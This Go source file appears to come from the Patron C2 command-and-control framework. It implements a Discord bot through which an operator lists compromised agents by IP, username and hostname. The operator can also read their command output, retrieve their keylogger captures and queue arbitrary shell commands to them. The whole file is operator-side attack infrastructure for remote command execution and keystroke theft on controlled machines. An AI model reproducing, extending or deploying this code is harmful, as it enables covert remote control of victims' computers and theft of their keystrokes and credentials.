package command

import (
	"fmt"
	"log"
	"os"
	"regexp"
	"database/sql"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/bwmarrin/discordgo"
	"github.com/google/uuid"
	"github.com/joho/godotenv"
)

//make it central
func IsValidUUID(u string) bool {
	_, err := uuid.Parse(u)
	return err == nil
}

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Fatalf("Error loading .env file")
	}

	return os.Getenv(key)
}

func sendAgentMessage(agents string, title string) *discordgo.MessageSend {
	sendMsg := &discordgo.MessageSend{
		Embeds: []*discordgo.MessageEmbed{{
			Type:        discordgo.EmbedTypeRich,
			Title:       title,
			Description: agents,
			Fields: []*discordgo.MessageEmbedField{
				{
					Name:   "Patron C2",
					Value:  "https://github.com/PatronC2/Patron",
					Inline: true,
				},
			},
		},
		},
	}
	fmt.Printf("type = %T\n", sendMsg)
	fmt.Printf("content = %#v\n", sendMsg.Embeds)
	return sendMsg
}

func GetBotAgents(db *sql.DB) *discordgo.MessageSend {
	var results strings.Builder
	// fmt.Println(db)
	for i := range data.Agents(db) {
		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data.Agents(db)[i].Uuid, data.Agents(db)[i].Username, data.Agents(db)[i].AgentIP, data.Agents(db)[i].Hostname, data.Agents(db)[i].Status)
	}
	// fmt.Println(results.String())

	// trims charaters
	if len([]rune(results.String())) <= 4096 {
		if results.String() == "" {
			return sendAgentMessage("Nothing yet!", "Empty!")
		} else {
			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent Info")
		}
	} else {
		return sendAgentMessage(results.String()[:4092]+"TRIM", "Agent Info")

	}
}

func GetBotAgent(db *sql.DB, message string) *discordgo.MessageSend {
	botmsg := strings.Split(message, " ")

	if len(botmsg) <= 1 {
		return &discordgo.MessageSend{
			Content: "Error! Invalid syntax `!refresh <uuid>`",
		}
	}
	// fmt.Println(botmsg)
	if !IsValidUUID(botmsg[1]) {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	}
	var results strings.Builder
	for i := range data.Agent(db, botmsg[1]) {
		fmt.Fprintf(&results, "`Command:` %s \n`Output:` %s", data.Agent(db, botmsg[1])[i].Command, data.Agent(db, botmsg[1])[i].Output)
	}
	//fmt.Println(results.String())

	// trims charaters
	if len([]rune(results.String())) <= 4096 {
		if results.String() == "" {
			return sendAgentMessage("Nothing yet!", "Agent: "+botmsg[1])
		} else {
			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent: "+botmsg[1])
		}
	} else {
		return sendAgentMessage(results.String()[:4092]+"TRIM", "Agent: "+botmsg[1])
	}
}

func GetBotKeys(db *sql.DB, message string) *discordgo.MessageSend {
	botmsg := strings.Split(message, " ")

	if len(botmsg) <= 1 {
		return &discordgo.MessageSend{
			Content: "Error! Invalid syntax `!keys <uuid>`",
		}
	}
	// fmt.Println(botmsg)
	if !IsValidUUID(botmsg[1]) {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	}

	var results strings.Builder
	fmt.Fprintf(&results, "`Keylog:` %s", data.Keylog(db, botmsg[1])[0].Keys)
	//fmt.Println(results.String())

	// trims charaters
	if len([]rune(results.String())) <= 4096 {
		if results.String() == "" {
			return sendAgentMessage("No Keys yet!", "Agent: "+botmsg[1])
		} else {
			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent: "+botmsg[1])
		}
	} else {
		return sendAgentMessage(results.String()[:4092]+"TRIM", "Agent: "+botmsg[1])
	}
}

func PostBotCmd(db *sql.DB, message string) *discordgo.MessageSend {
	newCmdID := uuid.New().String()
	botmsg := strings.Split(message, " ")

	if len(botmsg) <= 1 {
		return &discordgo.MessageSend{
			Content: "Error! Invalid syntax `!cmd <uuid> ^command^`",
		}
	}
	// fmt.Println(botmsg)
	if !IsValidUUID(botmsg[1]) {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
		return &discordgo.MessageSend{
			Content: "Error! Invalid uuid",
		}
	}

	commandraw := message
	re := regexp.MustCompile(`\^(.*?)\^`)
	command := re.FindStringSubmatch(commandraw)

	if len(command) > 2 || len(command) == 0 {
		return &discordgo.MessageSend{
			Content: "Error! Invalid command syntax \nUse !cmd <uuid> ^command^",
		}
	}

	data.SendAgentCommand(db, botmsg[1], "0", "shell", command[1], newCmdID)

	return &discordgo.MessageSend{
		Content: "!refresh " + botmsg[1],
	}
}
